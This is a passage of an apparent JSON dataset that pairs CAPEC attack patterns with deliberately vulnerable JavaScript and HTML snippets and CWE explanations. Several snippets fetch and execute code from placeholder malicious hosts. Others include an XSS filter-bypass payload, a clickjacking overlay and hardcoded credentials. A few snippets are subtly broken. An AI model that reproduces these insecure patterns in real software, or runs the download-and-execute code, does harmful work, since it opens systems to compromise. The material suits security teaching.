        "description": "This JavaScript code snippet uses the Express framework to create a simple web server. It demonstrates an incorrectly configured access control scenario where the '/admin' route does not use the 'checkUserRole' middleware to verify if the user has admin privileges, allowing unauthorized access to the admin panel. In contrast, the '/secure-admin' route correctly uses the 'checkUserRole' middleware to ensure that only users with the 'admin' role can access the secure admin panel. This example embodies the main idea of CAPEC-Exploiting Incorrectly Configured Access Control Security Levels and highlights CWE-732 (Incorrect Permission Assignment for Critical Resource) by showing how missing or incorrect access control checks can lead to unauthorized access."
    },
    {
        "capec_id": "181",
        "capec_name": "Flash File Overlay",
        "code_snippet": "<html>\n<head>\n  <style>\n    #overlay {\n      position: absolute;\n      top: 0;\n      left: 0;\n      width: 100%;\n      height: 100%;\n      opacity: 0;\n      z-index: 1000;\n    }\n  </style>\n</head>\n<body>\n  <div id=\"overlay\">\n    <object type=\"application/x-shockwave-flash\" data=\"malicious.swf\" width=\"100%\" height=\"100%\"></object>\n  </div>\n  <iframe src=\"https://trusted-site.com\" width=\"100%\" height=\"100%\"></iframe>\n</body>\n</html>",
        "description": "This code snippet demonstrates a Flash File Overlay attack, where a transparent Flash object is placed over a legitimate website to intercept user actions. The 'overlay' div is styled to cover the entire page with an opacity of 0, making it invisible to the user. The Flash object within this div can capture user clicks and perform actions as dictated by the attacker. The underlying iframe loads a trusted site, misleading the user into thinking they are interacting with the legitimate content. This attack leverages CWE-1021 (Improper Restriction of Rendered UI Layers or Frames) by not restricting the overlay, and CWE-942 (Permissive Cross-domain Policy with Untrusted Domains) if the Flash file is allowed to interact with the trusted site."
    },
    {
        "capec_id": "182",
        "capec_name": "Flash Injection",
        "code_snippet": "function loadFlashContent(url) {\n    if (!url.endsWith('.swf')) {\n        throw new Error('Invalid Flash content URL');\n    }\n    var flashObject = document.createElement('object');\n    flashObject.data = url;\n    document.body.appendChild(flashObject);\n}\n\n// Example usage\nvar userProvidedUrl = 'http://example.com/malicious.swf';\nloadFlashContent(userProvidedUrl);",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of loading Flash content based on a user-provided URL. The function `loadFlashContent` takes a URL as an argument and checks if it ends with '.swf'. If the check passes, it creates an HTML object element to load the Flash content and appends it to the document body. This code is vulnerable to Flash Injection attacks (CAPEC-20) because it relies on an incomplete validation mechanism (CWE-184) and does not properly validate the input URL (CWE-20). Additionally, it could lead to security issues if the Flash content is loaded from an untrusted domain (CWE-942). The example usage shows how an attacker could provide a malicious URL to exploit this vulnerability."
    },
    {
        "capec_id": "183",
        "capec_name": "IMAP/SMTP Command Injection",
        "code_snippet": "const http = require('http');\nconst querystring = require('querystring');\nconst net = require('net');\n\nhttp.createServer((req, res) => {\n  let body = '';\n  req.on('data', chunk => {\n    body += chunk.toString();\n  });\n  req.on('end', () => {\n    const parsedBody = querystring.parse(body);\n    const imapCommand = parsedBody.command;\n\n    // Vulnerable: Directly using user input in IMAP command without sanitization\n    const client = net.createConnection({ port: 143, host: 'localhost' }, () => {\n      client.write(`${imapCommand}\\r\\n`);\n    });\n\n    client.on('data', (data) => {\n      res.writeHead(200, { 'Content-Type': 'text/plain' });\n      res.end(data.toString());\n    });\n\n    client.on('error', (err) => {\n      res.writeHead(500, { 'Content-Type': 'text/plain' });\n      res.end('Internal Server Error');\n      console.error('Error:', err.message); // CWE-535: Exposure of Information Through Shell Error Message\n    });\n  });\n}).listen(8080, () => {\n  console.log('Server listening on port 8080');\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable web-mail server that accepts IMAP commands from user input and forwards them to a back-end IMAP server without proper sanitization. The code listens for HTTP requests, parses the body to extract the 'command' parameter, and directly sends this command to the IMAP server. This represents the CAPEC 'IMAP/SMTP Command Injection' where an attacker can inject malicious commands due to improper input validation (CWE-77). Additionally, the code logs error messages that may expose sensitive information (CWE-535). The lack of proper encoding or escaping of the user input (CWE-116) and reliance on client-side input for server-side operations (CWE-602) further highlight the vulnerabilities."
    },
    {
        "capec_id": "184",
        "capec_name": "Software Integrity Attack",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.get('http://example.com/malicious-code.js', (res) => {\n  if (res.statusCode === 200) {\n    let data = '';\n    res.on('data', (chunk) => { data += chunk; });\n    res.on('end', () => {\n      fs.writeFile('downloaded-code.js', data, (err) => {\n        if (err) throw err;\n        console.log('Code downloaded and saved. Executing...');\n        require('./downloaded-code.js');\n      });\n    });\n  } else {\n    console.log('Failed to download code.');\n  }\n}).on('error', (e) => {\n  console.error(`Got error: ${e.message}`);\n});",
        "description": "This JavaScript code snippet demonstrates a software integrity attack by downloading and executing code from a remote location without verifying its origin or integrity (CWE-494). The code uses the 'http' module to fetch a JavaScript file from a specified URL and saves it to the local filesystem. It then immediately executes the downloaded code using 'require', which could potentially contain embedded malicious code (CWE-506). This represents a significant security risk as it undermines the integrity of the software by allowing unverified and potentially harmful code to be executed."
    },
    {
        "capec_id": "185",
        "capec_name": "Malicious Software Download",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.get('http://malicious-website.com/malware.js', (res) => {\n  const file = fs.createWriteStream('malware.js');\n  res.pipe(file);\n  file.on('finish', () => {\n    file.close();\n    require('./malware.js'); // Execute the downloaded code without integrity check\n  });\n}).on('error', (err) => {\n  console.error('Download failed:', err);\n});",
        "description": "This JavaScript code snippet demonstrates a scenario where a script downloads and executes code from a remote source without performing any integrity checks. The code uses Node.js to make an HTTP GET request to a potentially malicious website, downloads a JavaScript file, and then immediately executes it. This embodies the CAPEC 'Malicious Software Download' by showing how an attacker could deceive a user or an automated process into downloading and running dangerous code. The related CWEs are represented as follows: CWE-494 (Download of Code Without Integrity Check) is directly shown by the lack of verification of the downloaded file's origin and integrity. CWE-506 (Embedded Malicious Code) and CWE-507 (Trojan Horse) are implied as the downloaded file could contain hidden malicious functionality. CWE-509 (Replicating Malicious Code) could be represented if the downloaded file attempts to spread itself. CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) could occur if the malicious code accesses sensitive information."
    },
    {
        "capec_id": "186",
        "capec_name": "Malicious Software Update",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nfunction downloadAndUpdate(url, filePath) {\n  http.get(url, (response) => {\n    if (response.statusCode === 200) {\n      const file = fs.createWriteStream(filePath);\n      response.pipe(file);\n      file.on('finish', () => {\n        file.close(() => {\n          console.log('Update downloaded and applied.');\n          require(filePath); // Execute the downloaded file\n        });\n      });\n    } else {\n      console.log('Failed to download update.');\n    }\n  }).on('error', (err) => {\n    console.error(`Error: ${err.message}`);\n  });\n}\n\ndownloadAndUpdate('http://malicious.example.com/update.js', 'update.js');",
        "description": "This JavaScript code snippet demonstrates a vulnerable software update mechanism. It downloads a file from a specified URL and executes it without verifying its integrity or origin. This embodies the CAPEC 'Malicious Software Update' by showing how an adversary could trick a user or system into downloading and running malicious code. The code lacks integrity checks (CWE-494), potentially contains embedded malicious code (CWE-506), and could be used to distribute replicating malicious code (CWE-509) or a Trojan horse (CWE-507)."
    },
    {
        "capec_id": "187",
        "capec_name": "Malicious Automated Software Update via Redirection",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nfunction downloadUpdate(url, dest, cb) {\n  const file = fs.createWriteStream(dest);\n  http.get(url, (response) => {\n    response.pipe(file);\n    file.on('finish', () => {\n      file.close(cb);\n    });\n  }).on('error', (err) => {\n    fs.unlink(dest);\n    if (cb) cb(err.message);\n  });\n}\n\n// URL of the update server (potentially malicious)\nconst updateUrl = 'http://malicious-server.com/update.exe';\nconst destination = '/path/to/update.exe';\n\ndownloadUpdate(updateUrl, destination, (err) => {\n  if (err) {\n    console.error('Download failed:', err);\n  } else {\n    console.log('Update downloaded successfully');\n    // Execute the downloaded update without integrity check\n    require('child_process').exec(destination, (error, stdout, stderr) => {\n      if (error) {\n        console.error(`Execution error: ${error}`);\n        return;\n      }\n      console.log(`stdout: ${stdout}`);\n      console.error(`stderr: ${stderr}`);\n    });\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable automated software update mechanism. The `downloadUpdate` function downloads an update from a specified URL and saves it to a destination path. The URL points to a potentially malicious server, and the downloaded file is executed without any integrity or authenticity checks. This embodies the CAPEC 'Malicious Automated Software Update via Redirection' by showing how an attacker can exploit the lack of proper server authentication and code integrity validation. The related CWEs are represented as follows: CWE-494 (Download of Code Without Integrity Check) is shown by the lack of verification of the downloaded file, CWE-294 (Authentication Bypass by Capture-replay) is implied by the potential for an attacker to redirect the update URL, CWE-602 (Client-Side Enforcement of Server-Side Security) is demonstrated by the client handling the update process, CWE-506 (Embedded Malicious Code) is the risk of executing the downloaded file, and CWE-807 (Reliance on Untrusted Inputs in a Security Decision) is shown by trusting the URL input for the update."
    },
    {
        "capec_id": "188",
        "capec_name": "Reverse Engineering",
        "code_snippet": "const crypto = require('crypto');\n\n// Using a weak cryptographic algorithm (CWE-327)\nfunction encrypt(data) {\n  const cipher = crypto.createCipher('des', 'weakpassword');\n  let encrypted = cipher.update(data, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return encrypted;\n}\n\n// Exposing sensitive system information (CWE-497)\nfunction getSystemInfo() {\n  return {\n    os: process.platform,\n    nodeVersion: process.version,\n    memoryUsage: process.memoryUsage()\n  };\n}\n\n// Undocumented feature (CWE-1242)\nfunction undocumentedFeature() {\n  console.log('This is an undocumented feature!');\n}\n\n// Main function demonstrating reverse engineering vulnerability\nfunction main() {\n  const sensitiveData = 'Sensitive Information';\n  const encryptedData = encrypt(sensitiveData);\n  console.log('Encrypted Data:', encryptedData);\n\n  const systemInfo = getSystemInfo();\n  console.log('System Info:', systemInfo);\n\n  undocumentedFeature();\n}\n\nmain();",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities that can be exploited through reverse engineering. The `encrypt` function uses a weak cryptographic algorithm (DES) with a hardcoded password, making it susceptible to attacks (CWE-327). The `getSystemInfo` function exposes sensitive system information, such as the operating system and memory usage, to unauthorized users (CWE-497). The `undocumentedFeature` function represents an undocumented feature that could be exploited by attackers (CWE-1242). The `main` function ties these elements together, showcasing how an attacker could reverse engineer the code to uncover and exploit these vulnerabilities."
    },
    {
        "capec_id": "189",
        "capec_name": "Black Box Reverse Engineering",
        "code_snippet": "function authenticate(userInput) {\n  const secretToken = 's3cr3t';\n  let isAuthenticated = false;\n  if (userInput === secretToken) {\n    isAuthenticated = true;\n  }\n  console.log(isAuthenticated ? 'Access granted' : 'Access denied');\n  return isAuthenticated;\n}\n\n// Simulate power consumption monitoring\nfunction simulatePowerConsumption(userInput) {\n  const powerConsumption = userInput === 's3cr3t' ? 100 : 50;\n  console.log(`Power consumption: ${powerConsumption}mW`);\n}\n\n// Example usage\nconst userInput = 'test';\nauthenticate(userInput);\nsimulatePowerConsumption(userInput);",
        "description": "This JavaScript code snippet demonstrates a simple authentication mechanism that is vulnerable to black box reverse engineering techniques. The `authenticate` function checks if the user input matches a hardcoded secret token and logs whether access is granted or denied. The `simulatePowerConsumption` function mimics a side-channel attack by logging different power consumption values based on whether the user input matches the secret token. This represents CWE-1255 (Comparison Logic is Vulnerable to Power Side-Channel Attacks) and CWE-1300 (Improper Protection of Physical Side Channels). The observable discrepancy in the power consumption values (CWE-203) can be exploited by an attacker to infer the secret token, demonstrating the concept of black box reverse engineering."
    },
    {
        "capec_id": "190",
        "capec_name": "Reverse Engineer an Executable to Expose Assumed Hidden Functionality",
        "code_snippet": "function hiddenFunction() {\n  // Hidden functionality not documented\n  console.log('This is a hidden function');\n}\n\nfunction downloadAndExecute(url) {\n  fetch(url)\n    .then(response => response.text())\n    .then(code => {\n      // Execute downloaded code without integrity check\n      eval(code);\n    })\n    .catch(error => console.error('Error:', error));\n}\n\n// Exposing sensitive system information\nfunction exposeSensitiveInfo() {\n  console.log('Sensitive Info: ', process.env);\n}\n\n// Main function\nfunction main() {\n  hiddenFunction();\n  downloadAndExecute('http://example.com/malicious.js');\n  exposeSensitiveInfo();\n}\n\nmain();",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to the CAPEC description of reverse engineering an executable to expose hidden functionality. The `hiddenFunction` function represents undocumented and hidden functionality (CWE-912). The `downloadAndExecute` function downloads and executes code from a remote location without verifying its integrity (CWE-494). The `exposeSensitiveInfo` function exposes sensitive system information to unauthorized actors (CWE-497). The `main` function calls these functions, showcasing how an attacker might exploit these vulnerabilities to reverse engineer and manipulate the software."
    },
    {
        "capec_id": "191",
        "capec_name": "Read Sensitive Constants Within an Executable",
        "code_snippet": "const SECRET_KEY = 'hardcoded_secret_key';\n\nfunction authenticate(user, password) {\n  const storedPassword = 'hardcoded_password';\n  if (password === storedPassword) {\n    console.log('Authentication successful');\n    return true;\n  } else {\n    console.log('Authentication failed');\n    return false;\n  }\n}\n\nfunction encryptData(data) {\n  // Simple XOR encryption for demonstration purposes\n  let encrypted = '';\n  for (let i = 0; i < data.length; i++) {\n    encrypted += String.fromCharCode(data.charCodeAt(i) ^ SECRET_KEY.charCodeAt(i % SECRET_KEY.length));\n  }\n  return encrypted;\n}\n\n// Example usage\nconst user = 'admin';\nconst password = 'hardcoded_password';\nif (authenticate(user, password)) {\n  const sensitiveData = 'Sensitive Information';\n  const encryptedData = encryptData(sensitiveData);\n  console.log('Encrypted Data:', encryptedData);\n}",
        "description": "This JavaScript code snippet demonstrates the concept of 'Read Sensitive Constants Within an Executable' by including hard-coded sensitive constants such as a secret key and a password. The `authenticate` function uses a hard-coded password for user authentication, and the `encryptData` function uses a hard-coded secret key for a simple XOR encryption. This code is vulnerable to attacks because an adversary can discover these hard-coded values through static or dynamic analysis of the executable, leading to potential security breaches. The code embodies related CWEs such as 'Use of Hard-coded Credentials' (CWE-798), 'Use of Hard-coded, Security-relevant Constants' (CWE-547), and 'Cleartext Storage of Sensitive Information in Executable' (CWE-318)."
    },
    {
        "capec_id": "192",
        "capec_name": "Protocol Analysis",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(8080, '127.0.0.1', () => {\n  console.log('Connected');\n  // CWE-319: Cleartext Transmission of Sensitive Information\n  client.write('username=admin&password=admin123');\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  client.destroy(); // kill client after server's response\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a basic TCP client that connects to a server on localhost at port 8080. Upon connection, it sends sensitive information (username and password) in cleartext, which embodies the main idea of CAPEC-272: Protocol Analysis. The code is vulnerable to CWE-319 (Cleartext Transmission of Sensitive Information) as it transmits sensitive data without encryption, making it susceptible to interception and analysis by an adversary. This example highlights the risks associated with inadequate protection of protocol communications."
    },
    {
        "capec_id": "193",
        "capec_name": "PHP Remote File Inclusion",
        "code_snippet": "const http = require('http');\nconst url = require('url');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const filePath = queryObject.file;\n\n  if (filePath) {\n    fs.readFile(filePath, 'utf8', (err, data) => {\n      if (err) {\n        res.writeHead(404, {'Content-Type': 'text/plain'});\n        res.end('File not found');\n      } else {\n        res.writeHead(200, {'Content-Type': 'text/html'});\n        res.end(data);\n      }\n    });\n  } else {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.end('No file specified');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that reads and serves files based on a 'file' query parameter from the URL. The server uses the 'fs' module to read the file specified by the user and sends its content back in the HTTP response. This code is vulnerable to Local File Inclusion (LFI) attacks, where an attacker can specify any file path, potentially accessing sensitive files on the server. This embodies the main idea of the CAPEC 'PHP Remote File Inclusion' by demonstrating how improper control of file paths can lead to security vulnerabilities. The related CWEs are represented by the lack of input validation (CWE-98), potential for XSS if the file contains malicious scripts (CWE-80), and reliance on user-supplied file paths (CWE-646)."
    },
    {
        "capec_id": "194",
        "capec_name": "Fake the Source of Data",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst port = 3000;\n\napp.use(express.json());\n\n// Vulnerable endpoint\napp.post('/submit', (req, res) => {\n  const { user, data } = req.body;\n  // Improper Authentication: No verification of the user's identity\n  console.log(`Received data from user: ${user}`);\n  // Process the data without verifying the source\n  res.send('Data received');\n});\n\napp.listen(port, () => {\n  console.log(`Server running on port ${port}`);\n});",
        "description": "This JavaScript code snippet sets up an Express server with a vulnerable endpoint '/submit'. The endpoint accepts POST requests with a JSON body containing 'user' and 'data' fields. The code logs the user and processes the data without verifying the user's identity or the source of the request. This lack of proper authentication and verification makes the endpoint susceptible to attacks where an adversary can fake the source of the data, leading to potential privilege escalation, data manipulation, or other malicious activities. The code embodies the main idea of the CAPEC 'Fake the Source of Data' and demonstrates related CWEs such as Improper Authentication (CWE-287) and Improper Verification of Source of a Communication Channel (CWE-940)."
    },
    {
        "capec_id": "195",
        "capec_name": "Principal Spoof",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst port = 3000;\n\n// Simulated user database\nconst users = {\n  'user1': 'password1',\n  'user2': 'password2'\n};\n\n// Middleware to simulate weak authentication\napp.use((req, res, next) => {\n  const username = req.headers['x-username'];\n  const password = req.headers['x-password'];\n  if (users[username] && users[username] === password) {\n    req.user = username;\n  }\n  next();\n});\n\n// Endpoint that can be spoofed\napp.get('/data', (req, res) => {\n  if (req.user) {\n    res.send(`Sensitive data for ${req.user}`);\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\napp.listen(port, () => {\n  console.log(`Server running at http://localhost:${port}/`);\n});",
        "description": "This JavaScript code snippet sets up an Express server with a weak authentication mechanism that can be easily spoofed. The middleware checks for 'x-username' and 'x-password' headers to authenticate users, but it does not sufficiently verify the identity of the user, making it vulnerable to Principal Spoof attacks. An attacker can craft a request with these headers to impersonate a legitimate user and gain unauthorized access to sensitive data. This example embodies the main idea of CAPEC-Principal Spoof and highlights related CWEs such as Weak Authentication (CWE-1390) and Authentication Bypass by Spoofing (CWE-290)."
    },
    {
        "capec_id": "196",
        "capec_name": "Session Credential Falsification through Forging",
        "code_snippet": "const crypto = require('crypto');\n\nfunction generateSessionToken(userId) {\n  // Weak credentials: using predictable userId and timestamp\n  const timestamp = Date.now();\n  const token = `${userId}:${timestamp}`;\n  return crypto.createHash('sha256').update(token).digest('hex');\n}\n\nfunction authenticateUser(userId, password) {\n  // Simulate user authentication\n  if (password === 'password123') { // Use of weak credentials\n    const sessionToken = generateSessionToken(userId);\n    console.log(`User authenticated. Session token: ${sessionToken}`);\n    return sessionToken;\n  } else {\n    console.log('Authentication failed.');\n    return null;\n  }\n}\n\n// Simulate a user login\nconst userId = 'user1';\nconst password = 'password123';\nconst sessionToken = authenticateUser(userId, password);\n\n// Attacker forges a session token\nconst forgedToken = generateSessionToken('attacker');\nconsole.log(`Forged session token: ${forgedToken}`);",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker can forge a session token to gain unauthorized access to a service. The `generateSessionToken` function creates a session token using a predictable combination of userId and timestamp, which is then hashed. The `authenticateUser` function simulates user authentication using weak credentials (a hard-coded password). After a user is authenticated, a session token is generated and returned. The code also shows how an attacker can forge a session token by generating a token for an 'attacker' userId. This embodies the main idea of CAPEC-Session Credential Falsification through Forging, highlighting vulnerabilities such as the use of weak credentials (CWE-1391) and improper control of session tokens (CWE-384, CWE-664)."
    },
    {
        "capec_id": "197",
        "capec_name": "Exponential Data Expansion",
        "code_snippet": "function expandEntity(entity, depth) {\n  if (depth > 10) return entity;\n  return expandEntity(entity + entity, depth + 1);\n}\n\nlet initialEntity = 'A';\nlet expandedEntity = expandEntity(initialEntity, 0);\nconsole.log(expandedEntity.length);",
        "description": "This JavaScript code snippet demonstrates an exponential data expansion vulnerability. The `expandEntity` function recursively concatenates the input `entity` with itself, doubling its size with each recursive call. The `depth` parameter controls the recursion depth, and the function stops if the depth exceeds 10. However, even with a depth of 10, the resulting string length grows exponentially, leading to excessive memory and CPU usage. This example embodies the main idea of CAPEC-230 (Exponential Data Expansion) and highlights CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-776 (Improper Restriction of Recursive Entity References in DTDs)."
    },
    {
        "capec_id": "198",
        "capec_name": "XSS Targeting Error Pages",
        "code_snippet": "<!DOCTYPE html>\n<html>\n<head>\n    <title>Error Page</title>\n</head>\n<body>\n    <h1>Error</h1>\n    <p id=\"errorMessage\"></p>\n    <script>\n        // Simulate receiving a malformed request with exploit code\n        var errorMessage = decodeURIComponent(window.location.search.substring(1));\n        // Improper neutralization of input\n        document.getElementById('errorMessage').innerHTML = errorMessage;\n    </script>\n</body>\n</html>",
        "description": "This code snippet represents a vulnerable error page that improperly handles user input, leading to a potential XSS attack. The error message is extracted from the URL query string without proper sanitization and is directly inserted into the HTML content using `innerHTML`. This can allow an attacker to inject malicious scripts into the error page, exploiting the vulnerability described in CAPEC-81 and related CWEs such as CWE-79, CWE-80, and CWE-81. The code demonstrates how an attacker could craft a URL with a malicious script that gets executed when the error page is displayed."
    },
    {
        "capec_id": "199",
        "capec_name": "XSS Using Alternate Syntax",
        "code_snippet": "const userInput = '<ScRiPt>alert(\"XSS Attack!\")</ScRiPt>';\nconst sanitizedInput = userInput.replace(/<script>/gi, '');\ndocument.body.innerHTML = sanitizedInput;",
        "description": "This JavaScript code snippet demonstrates a vulnerability to XSS using alternate syntax. The user input contains a script tag with mixed case ('<ScRiPt>'), which is a common technique to bypass case-sensitive filters. The sanitization step attempts to remove script tags by replacing occurrences of '<script>' with an empty string, but it fails to account for alternate case variations. As a result, the malicious script is not removed and gets executed, leading to an XSS attack. This example highlights the importance of proper neutralization of alternate script syntax (CWE-87) and the risks of incomplete denylist-based protection mechanisms (CWE-692)."
    },
    {
        "capec_id": "200",
        "capec_name": "Removal of filters: Input filters, output filters, data masking",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Middleware to remove input filters\napp.use((req, res, next) => {\n  // Intentionally bypassing input validation\n  next();\n});\n\napp.post('/submit', (req, res) => {\n  const userInput = req.body.input;\n  // Directly using user input without validation or sanitization\n  eval(userInput); // CWE-74: Injection vulnerability\n  res.send('Input processed');\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable Express.js application where input filters are intentionally removed, leading to several security weaknesses. The middleware function bypasses any input validation, allowing potentially malicious data to be processed. In the '/submit' route, user input is directly used in an 'eval' function without any sanitization or validation, making the application susceptible to code injection attacks (CWE-74). This example embodies the main idea of the CAPEC by showing how the removal of input filters can lead to severe security vulnerabilities."
    },
    {
        "capec_id": "201",
        "capec_name": "Serialized Data External Linking",
        "code_snippet": "const fs = require('fs');\nconst yaml = require('js-yaml');\n\n// Load YAML file with external reference\ntry {\n  const data = fs.readFileSync('data.yaml', 'utf8');\n  const doc = yaml.load(data);\n  console.log(doc);\n} catch (e) {\n  console.error(e);\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to 'Serialized Data External Linking' (CAPEC). The code reads a YAML file ('data.yaml') and parses it using the 'js-yaml' library. If the YAML file contains an external reference, the parser may not validate it, potentially allowing an adversary to include arbitrary files or connections. This can lead to unauthorized access to sensitive information. The code snippet embodies CWE-611 (Improper Restriction of XML External Entity Reference) and CWE-502 (Deserialization of Untrusted Data) by showing how external references in serialized data can be mishandled, leading to security risks."
    },
    {
        "capec_id": "202",
        "capec_name": "Create Malicious Client",
        "code_snippet": "const net = require('net');\n\n// Malicious client that bypasses server-side authentication\nconst client = new net.Socket();\nclient.connect(1337, '127.0.0.1', () => {\n    console.log('Connected to server');\n    // Send a crafted message that bypasses authentication\n    client.write(JSON.stringify({ action: 'bypass_auth', token: 'malicious_token' }));\n});\n\nclient.on('data', (data) => {\n    console.log('Received: ' + data);\n    // Perform malicious actions\n    if (data.toString().includes('authenticated')) {\n        client.write(JSON.stringify({ action: 'steal_data' }));\n    }\n});\n\nclient.on('close', () => {\n    console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a malicious client that connects to a server and attempts to bypass server-side authentication by sending a crafted message. The client sends a JSON object with an action 'bypass_auth' and a 'malicious_token' to trick the server into thinking the client is authenticated. Once the server responds with an 'authenticated' message, the client proceeds to perform further malicious actions, such as attempting to steal data. This code embodies the main idea of the CAPEC 'Create Malicious Client' by violating the server's assumptions about client behavior and exploiting weaknesses like 'Client-Side Enforcement of Server-Side Security' (CWE-602) and 'Use of Client-Side Authentication' (CWE-603)."
    },
    {
        "capec_id": "203",
        "capec_name": "Manipulate Registry Information",
        "code_snippet": "const fs = require('fs');\nconst registryPath = '/path/to/registry/file';\n\n// Read the registry file\nlet registryContent = fs.readFileSync(registryPath, 'utf8');\n\n// Manipulate registry content\nregistryContent = registryContent.replace('originalValue', 'maliciousValue');\n\n// Write the manipulated content back to the registry file\nfs.writeFileSync(registryPath, registryContent, 'utf8');\n\nconsole.log('Registry content manipulated successfully.');",
        "description": "This JavaScript code snippet demonstrates how an adversary might manipulate registry information by reading a registry file, modifying its content, and writing the manipulated content back to the file. The code reads the registry file from a specified path, replaces an 'originalValue' with a 'maliciousValue', and writes the modified content back to the registry file. This embodies the main idea of CAPEC-203 (Manipulate Registry Information) by showing how an attacker can exploit a weakness in authorization to modify registry content. The related CWEs provide additional context, such as the potential for external control of system settings (CWE-15) and the risks of storing sensitive information in cleartext (CWE-314)."
    },
    {
        "capec_id": "204",
        "capec_name": "Lifting Sensitive Data Embedded in Cache",
        "code_snippet": "const sensitiveData = 'user_password';\n\n// Store sensitive data in local storage (cache)\nlocalStorage.setItem('cachedData', sensitiveData);\n\n// Retrieve sensitive data from local storage\nconst retrievedData = localStorage.getItem('cachedData');\nconsole.log('Retrieved Data:', retrievedData);",
        "description": "This JavaScript code snippet demonstrates the vulnerability described in the CAPEC by storing sensitive information (a user's password) in the browser's local storage, which acts as a cache. The code then retrieves and logs this sensitive data. This example embodies CWE-524 (Use of Cache Containing Sensitive Information) and CWE-525 (Use of Web Browser Cache Containing Sensitive Information) by showing how sensitive data can be stored in a cache that can be accessed by an attacker. The lack of encryption (CWE-311) further exacerbates the vulnerability, making it easy for an attacker to lift sensitive data from the cache."
    },
    {
        "capec_id": "205",
        "capec_name": "DEPRECATED: Lifting credential(s)/key material embedded in client distributions (thick or thin)",
        "code_snippet": "const credentials = { username: 'admin', password: 'password123' }; \n\nfunction authenticate(user, pass) { \n  if (user === credentials.username && pass === credentials.password) { \n    console.log('Authentication successful'); \n    return true; \n  } else { \n    console.log('Authentication failed'); \n    return false; \n  } \n} \n\n// Example usage \nauthenticate('admin', 'password123');",
        "description": "This JavaScript code snippet demonstrates a vulnerable approach to handling authentication by embedding credentials directly within the client-side code. The `credentials` object stores the username and password in plain text, which can be easily retrieved by an attacker. The `authenticate` function checks the provided username and password against these hardcoded credentials. This approach is insecure because it exposes sensitive data (CWE-522: Insufficiently Protected Credentials) and relies on client-side authentication (CWE-603: Use of Client-Side Authentication), making it susceptible to various attacks such as credential lifting and replay attacks (CWE-294: Authentication Bypass by Capture-replay). The main idea represented here is the risk of embedding sensitive data within client distributions, which can be easily exploited by attackers."
    },
    {
        "capec_id": "206",
        "capec_name": "Signing Malicious Code",
        "code_snippet": "const fs = require('fs');\nconst crypto = require('crypto');\n\n// CWE-798: Use of Hard-coded Credentials\nconst signingKey = 'hardcoded-signing-key';\n\n// CWE-732: Incorrect Permission Assignment for Critical Resource\nfs.chmodSync('signingKey.pem', 0o777); // Insecure permission assignment\n\n// CWE-494: Download of Code Without Integrity Check\nconst maliciousCode = fs.readFileSync('http://malicious.example.com/malicious.js', 'utf8');\n\n// Sign the malicious code\nconst sign = crypto.createSign('SHA256');\nsign.update(maliciousCode);\nsign.end();\nconst signature = sign.sign(signingKey, 'hex');\n\n// CWE-506: Embedded Malicious Code\nconst signedMaliciousCode = `/* Malicious Code */\n${maliciousCode}\n/* Signature: ${signature} */`;\n\n// Save the signed malicious code\nfs.writeFileSync('signedMaliciousCode.js', signedMaliciousCode);\n\nconsole.log('Malicious code signed and saved as signedMaliciousCode.js');",
        "description": "This JavaScript code snippet demonstrates the concept of 'Signing Malicious Code' by using a hard-coded signing key (CWE-798) to sign a piece of malicious code downloaded without integrity checks (CWE-494). The code also sets insecure permissions on the signing key file (CWE-732), making it accessible to unintended actors. The malicious code is then signed and saved, embedding the malicious content (CWE-506) with a signature that would deceive users or tools into believing it is legitimate."
    },
    {
        "capec_id": "207",
        "capec_name": "Removing Important Client Functionality",
        "code_snippet": "function authenticateUser(username, password) {\n  // Client-side authentication (CWE-603)\n  if (username === 'admin' && password === 'password123') {\n    return true;\n  }\n  return false;\n}\n\nfunction performSensitiveAction() {\n  // Client-side enforcement of server-side security (CWE-602)\n  if (authenticateUser(prompt('Username:'), prompt('Password:'))) {\n    alert('Sensitive action performed!');\n  } else {\n    alert('Authentication failed!');\n  }\n}\n\n// Removing important client functionality (CAPEC-Removing Important Client Functionality)\n// An attacker can bypass the authentication by modifying the client-side code\nperformSensitiveAction();",
        "description": "This JavaScript code snippet demonstrates a scenario where client-side authentication is used to protect a sensitive action. The `authenticateUser` function checks the username and password on the client side (CWE-603). The `performSensitiveAction` function relies on this client-side authentication to perform a sensitive action (CWE-602). An attacker can easily bypass this protection by modifying the client-side code, such as removing or altering the `authenticateUser` function, thus removing important client functionality that the server assumes to be present and trustworthy (CAPEC-Removing Important Client Functionality). This example highlights the vulnerability of relying on client-side mechanisms for security decisions."
    },
    {
        "capec_id": "208",
        "capec_name": "Removing/short-circuiting 'Purse' logic: removing/mutating 'cash' decrements",
